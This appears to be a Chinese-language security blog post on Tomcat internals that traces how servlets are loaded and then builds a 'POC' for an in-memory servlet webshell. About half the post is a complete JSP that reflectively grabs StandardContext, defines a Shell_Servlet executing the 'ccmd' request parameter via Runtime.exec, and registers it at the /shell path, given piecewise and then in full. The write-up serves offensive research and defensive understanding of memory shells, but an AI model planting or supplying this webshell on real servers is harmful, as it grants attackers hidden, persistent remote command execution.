## Servlet

### 加载servlet流程

把断点下在init(),看调用栈

![image-20240629210821179](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629210821179.png)

**StandardWrapper#loadServlet**

![image-20240629211404151](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629211404151.png)

调用inintServlet，传入servlet参数，同样在该函数中

![image-20240629211451083](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629211451083.png)

**StandardContext#loadOnStartup**

![image-20240629211847746](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629211847746.png)

![image-20240629211923566](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629211923566.png)

wrapper来自于child对象的转换，children来自于ContainerBase#findChildren

![image-20240629212020447](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629212020447.png)

![image-20240629212102657](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629212102657.png)

最后传入的Children参数是Standardwrapper对象

![image-20240629212312908](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629212312908.png)

可以看到最后一个对象就是我们的servlet,因此主要修改这里

最后会调用到addChild()

**创建StandardWrapper**

来看下这里的standardWrapper对象是如何创建的

跟到ContextConfig#webConfig()

![image-20240630212100105](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240630212100105.png)

解析web.xml各种参数

调用ContextConfig#configureContext来创建wrapper

![image-20240630212215863](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240630212215863.png)

![image-20240630212357937](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240630212357937.png)

创建的servlet参数存在servletMappings参数中

至此我们基本思路可以确定

获取StandardContext,创建一个恶意wrapper对象并加载该对象，将url对应的参数添加进servletMappings

### POC编写

首先获取StandardContxt对象

```jsp
<%
    //获取ApplicationContextFaced类
    ServletContext servletContext = request.getSession().getServletContext();
    //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象
    Field appContext = servletContext.getClass().getDeclaredField("context");
    appContext.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);
    //获取StandardContext
    Field stdContext = applicationContext.getClass().getDeclaredField("context");
    stdContext.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);
%>
```

创建恶意的Servlet

```jsp
<%!
 
    public class Shell_Servlet implements Servlet {
        @Override
        public void init(ServletConfig config) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("ccmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
    }
 
%>
```

准备wrapper对象，设置对应的参数并添加进当前context上下文

```jsp
<%
    Shell_Servlet shell_servlet = new Shell_Servlet();
    String name = shell_servlet.getClass().getSimpleName();
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName(name);
    wrapper.setLoadOnStartup(1);
    wrapper.setServlet(shell_servlet);
    wrapper.setServletClass(shell_servlet.getClass().getName());

    //将wrapper对象添加进StandardContext
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/shell",name);
%>
```

**完整poc**

```jsp
<%--
  Created by IntelliJ IDEA.
  User: Administrator
  Date: 2024/6/30
  Time: 21:31
  To change this template use File | Settings | File Templates.
--%>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>


<%
    //获取ApplicationContextFaced类
    ServletContext servletContext = request.getSession().getServletContext();
    //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象
    Field appContext = servletContext.getClass().getDeclaredField("context");
    appContext.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);
    //获取StandardContext
    Field stdContext = applicationContext.getClass().getDeclaredField("context");
    stdContext.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);
%>
<%!

    public class Shell_Servlet implements Servlet {
        @Override
        public void init(ServletConfig config) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("ccmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
    }

%>
<%
    Shell_Servlet shell_servlet = new Shell_Servlet();
    String name = shell_servlet.getClass().getSimpleName();
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName(name);
    wrapper.setLoadOnStartup(1);
    wrapper.setServlet(shell_servlet);
    wrapper.setServletClass(shell_servlet.getClass().getName());

    //将wrapper对象添加进StandardContext
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/shell",name);
%>
```

效果如图

![image-20240630215445484](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240630215445484.png)

